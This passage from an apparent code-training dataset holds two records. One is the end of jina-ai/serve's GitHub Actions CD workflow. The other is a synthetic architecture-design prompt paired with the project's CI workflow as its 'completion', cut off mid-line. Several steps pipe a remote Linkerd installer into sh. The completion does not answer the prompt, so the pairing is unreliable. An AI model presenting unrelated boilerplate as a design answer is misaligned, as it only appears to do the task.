python-cibuildwheels: '39'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n    steps:\n      - name: Check out repository\n        uses: actions/checkout@v2.5.0\n\n      - name: Set up Python ${{ matrix.python }}\n        uses: actions/setup-python@v2\n        with:\n          python-version: ${{ matrix.python }}\n\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Update version\n        run: |\n          DEVDELTA=${{needs.mark-dev-N.outputs.devdelta}}\n          RELEASE_VER=${{needs.mark-dev-N.outputs.releasever}}\n          INIT_FILE='jina/__init__.py'\n          DEV_VER=$RELEASE_VER\".dev\"$DEVDELTA\n          echo \"DEVDELTA $DEVDELTA\"\n          echo \"RELEASE_VER $RELEASE_VER\"\n          echo \"DEV_VER $DEV_VER\"\n          if [[ \"${{ matrix.os }}\" == \"macos-latest\" ]]; then\n            sed -i '' '/'\"${RELEASE_VER}\"'/s/.*/'\"__version__ = '${DEV_VER}'\"'/' \"${INIT_FILE}\"\n          else\n            sed -i '/'\"${RELEASE_VER}\"'/s/.*/'\"__version__ = '${DEV_VER}'\"'/' \"${INIT_FILE}\"\n          fi\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        if: ${{ matrix.os == 'ubuntu-latest' }}\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons ${{ matrix.python-manylinux-tag }}\n\n      - name: Build wheels with cibuildwheels on macos\n        env:\n          CIBW_BUILD: cp${{ matrix.python-cibuildwheels }}-${{ matrix.platform_id }}\n          CIBW_ARCHS: ${{ matrix.arch }}\n          CIBW_TEST_COMMAND: python -c \"import jina; import jraft\"\n          CIBW_BUILD_VERBOSITY: 1\n          GOARCH: ${{ matrix.goarch }}\n          CGO_ENABLED: 1\n        if: ${{ matrix.os == 'macos-latest' }}\n        run: |\n          python -m cibuildwheel --output-dir dist\n\n      - name: Upload wheels as artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: artifacts-${{ strategy.job-index }}\n          path: dist/*.whl\n\n# comment for now, do it manually if needed\n  # pre-release:\n  #   if: |\n  #     !startsWith(github.event.head_commit.message, 'chore') &&\n  #     !startsWith(github.event.head_commit.message, 'build: hotfix') &&\n  #     !endsWith(github.event.head_commit.message, 'reformatted by jina-dev-bot')\n  #   needs: [build-wheels, mark-dev-N]\n  #   runs-on: ubuntu-latest\n  #   steps:\n  #     - uses: actions/checkout@v2.5.0\n  #       with:\n  #         #          submodules: true\n  #         fetch-depth: 100\n  #     - run: |\n  #         truncate --size=24KB README.md > README-trunc.md\n  #     - uses: actions/download-artifact@v3\n  #       with:\n  #         name: artifact\n  #         path: dist\n\n  #     - name: Update version\n  #       run: |\n  #         DEVDELTA=${{needs.mark-dev-N.outputs.devdelta}}\n  #         RELEASE_VER=${{needs.mark-dev-N.outputs.releasever}}\n  #         INIT_FILE='jina/__init__.py'\n  #         DEV_VER=$RELEASE_VER\".dev\"$DEVDELTA\n  #         echo \"DEVDELTA $DEVDELTA\"\n  #         echo \"RELEASE_VER $RELEASE_VER\"\n  #         echo \"DEV_VER $DEV_VER\"\n  #         sed -i '/'\"${RELEASE_VER}\"'/s/.*/'\"__version__ = '${DEV_VER}'\"'/' \"${INIT_FILE}\"\n  #     - name: Pre-release (.devN)\n  #       run: |\n  #         pip install twine wheel\n  #         ./scripts/release.sh\n  #       env:\n  #         TWINE_USERNAME: ${{ secrets.TWINE_USERNAME }}\n  #         TWINE_PASSWORD: ${{ secrets.TWINE_PASSWORD }}\n  #         JINA_SLACK_WEBHOOK: ${{ secrets.JINA_SLACK_WEBHOOK }}\n\n  core-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        test-path: ${{fromJson(needs.prep-testbed.outputs.matrix)}}\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          pip install grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/docarray_v2/*' --ignore-glob='tests/integration/stateful/*' --ignore-glob='tests/integration/hub_usage/dummyhub*' ${{ matrix.test-path }}\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINAHUB_USERNAME: ${{ secrets.JINAHUB_USERNAME }}\n          JINAHUB_PASSWORD: ${{ secrets.JINAHUB_PASSWORD }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check file existence\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  import-test:\n    runs-on: ubuntu-latest\n    needs: update-schema\n    strategy:\n      fail-fast: false\n      matrix:\n        core: ['', 'true']\n        perf: ['', 'true']\n        python-version: [\"3.8\", \"3.9\", \"3.10\", \"3.11\"]\n        exclude: \n          - core: 'true'\n            perf: 'true'\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-env }}\n      - name: Prepare enviroment\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install --no-cache-dir .\n          pip list\n        env:\n          JINA_PIP_INSTALL_CORE: ${{ matrix.core }}\n          JINA_PIP_INSTALL_PERF: ${{ matrix.perf }}\n      - name: Test basic import\n        run: python -c 'from jina import Executor,requests,Client,Flow,dynamic_batching,Document,DocumentArray'\n  docker-image-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: registry:2\n        ports:\n          - 5000:5000\n    strategy:\n      fail-fast: false\n      matrix:\n        test-arch: [\"linux/amd64\", \"linux/arm64\"]\n    steps:\n      #      - name: Cancel Previous Runs\n      #        uses: styfle/cancel-workflow-action@0.9.0\n      #        with:\n      #          access_token: ${{ github.token }}\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Docker Buildx\n        id: buildx\n        uses: docker/setup-buildx-action@v1\n        with:\n          install: true\n          driver-opts: network=host\n      - run: |\n          docker run --privileged --rm tonistiigi/binfmt --uninstall qemu-aarch64\n          docker run --rm --privileged tonistiigi/binfmt --install all\n      - name: Build and test\n        uses: docker/build-push-action@v2\n        with:\n          context: .\n          file: Dockerfiles/debianx.Dockerfile\n          platforms: ${{ matrix.test-arch }}\n          push: true\n          tags: localhost:5000/jina/multiarch:latest\n          target: jina\n      - run: |\n          docker run --platform ${{ matrix.test-arch }} localhost:5000/jina/multiarch:latest -v\n\n  k8s-flow-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Flow\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_flow.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-deployment-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Deployment\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_deployment.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-graceful-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test graceful request handling on k8s\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_graceful_request_handling.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-failures-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s failures\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          curl --proto '=https' --tlsv1.2 -sSfL https://linkerd.github.io/linkerd-smi/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_failures.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-otel-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test K8s with OpenTelemetry\n        run: |\n          pytest -v -s --cov=jina --cov-report=xml ./tests/k8s_otel\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  docker-compose-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test docker compose\n        run: |\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/docker_compose/test_*.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  benchmark-pre-release:\n    runs-on: ubuntu-latest\n    needs: [update-schema, mark-dev-N]\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 200\n      - run: |\n          DEVDELTA=${{needs.mark-dev-N.outputs.devdelta}}\n          RELEASE_VER=${{needs.mark-dev-N.outputs.releasever}}\n          NEXT_VER=$RELEASE_VER\".dev\"$COMMITS_SINCE_LAST_VER\n          echo \"NEXT_VER=$NEXT_VER\" >> $GITHUB_ENV\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          token: ${{ secrets.JINA_DEV_BOT }}\n          workflow: Benchmark Jina\n          repo: jina-ai/jina-terraform\n          ref: \"main\"\n          inputs: '{ \"pypi_releases\": \"[\\\"${{ env.NEXT_VER }}\\\"]\"}'\n  # just for blocking the merge until all parallel core-test are successful\n  success-all-steps:\n    runs-on: ubuntu-latest\n    needs: [core-test, docarray-v-two-test, stateful-docarray-v-two-test, import-test, k8s-flow-test, k8s-deployment-test, k8s-graceful-test, k8s-failures-test, k8s-otel-test, docker-compose-test, docker-image-test, benchmark-pre-release, update-schema, update-docker] #, pre-release]\n    if: always()\n    steps:\n      - uses: technote-space/workflow-conclusion-action@v2\n      - name: Check Failure\n        if: env.WORKFLOW_CONCLUSION == 'failure'\n        run: exit 1\n      - name: Success\n        if: ${{ success() }}\n        run: echo \"All Done\"\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/cd.yml", "language": "yaml", "complexity": "complex", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 876}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CI\n\non:\n  pull_request:\n    paths-ignore:\n      - 'docs/**'\n      - 'README.md'\n\n#on:\n#  push:\n#    branches-ignore:\n#      - '**'  # temporally ignore all\njobs:\n  commit-lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 0\n      - uses: wagoid/commitlint-github-action@v3\n\n  lint-flake-8:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Lint with flake8\n        run: |\n          pip install flake8\n          # stop the build if there are Python syntax errors or undefined names\n          flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics --exclude .git,__pycache__,docs/source/conf.py,old,build,dist,tests/,jina/resources/,jina/proto/docarray_v1,jina/proto/docarray_v2,jina/serve/consensus/add_voter/pb,jina/serve/consensus/add_voter/pb2\n          # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide\n          flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics --exclude .git,__pycache__,docs/source/conf.py,old,build,dist,tests/,jina/proto/docarray_v1,jina/proto/docarray_v2,jina/serve/consensus/add_voter/pb,jina/serve/consensus/add_voter/pb2\n\n  check-docstring:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v2\n        with:\n          python-version: \"3.10\"\n      - id: file_changes\n        uses: Ana06/get-changed-files@v1.2\n      - name: docstring check with darglint and pydocstyle\n        run: ./scripts/docstrings_lint.sh\n        env:\n          CHANGED_FILES: ${{ steps.file_changes.outputs.added_modified }}\n\n  check-black:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - id: file_changes\n        uses: Ana06/get-changed-files@v1.2\n      - name: check black\n        run: ./scripts/black.sh\n        env:\n          CHANGED_FILES: ${{ steps.file_changes.outputs.added_modified }}\n\n  code-injection:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        with:\n          token: ${{ secrets.GITHUB_TOKEN }}\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        with:\n          python-version: \"3.10\"\n      - name: Styling\n        id: styling\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        run: |\n          git config --local user.email \"dev-bot@jina.ai\"\n          git config --local user.name \"Jina Dev Bot\"\n          pip install \".[devel,black]\"\n          pip install setuptools\n          cd scripts && bash ./devbot.sh && cd -\n          if [[ -z $(git status -s) ]]\n          then\n            echo \"tree is clean\"\n          else\n            git add -u\n            git commit -m \"style: fix overload and cli autocomplete\"\n            echo \"IS_CHANGED=YES\" >> $GITHUB_OUTPUT\n          fi\n      - name: Push changes to head ref\n        uses: ad-m/github-push-action@v0.6.0\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        with:\n          github_token: ${{ secrets.JINA_DEV_BOT }}\n          branch: ${{ github.head_ref }}\n      - name: Fail this pipelint\n        if: ${{ steps.styling.outputs.IS_CHANGED == 'YES' && !github.event.pull_request.head.repo.fork }}\n        run: exit 1\n\n  docker-image-test:\n    needs: [code-injection]\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: registry:2\n        ports:\n          - 5000:5000\n    strategy:\n      fail-fast: false\n      matrix:\n        test-arch: [\"linux/amd64\", \"linux/arm64\"]\n    steps:\n#      - name: Cancel Previous Runs\n#        uses: styfle/cancel-workflow-action@0.9.0\n#        with:\n#          access_token: ${{ github.token }}\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Docker Buildx\n        id: buildx\n        uses: docker/setup-buildx-action@v1\n        with:\n          install: true\n          driver-opts: network=host\n      - run: |\n          docker run --privileged --rm tonistiigi/binfmt --uninstall qemu-aarch64\n          docker run --rm --privileged tonistiigi/binfmt --install all\n      - name: Build and test\n        uses: docker/build-push-action@v2\n        with:\n          context: .\n          file: Dockerfiles/debianx.Dockerfile\n          platforms: ${{ matrix.test-arch }}\n          push: true\n          tags: localhost:5000/jina/multiarch:latest\n          target: jina\n      - run: |\n          docker run --platform ${{ matrix.test-arch }} localhost:5000/jina/multiarch:latest -v\n\n  k8s-flow-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Flow\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_flow.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-deployment-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Deployment\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_deployment.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-graceful-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test graceful request handling on k8s\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl 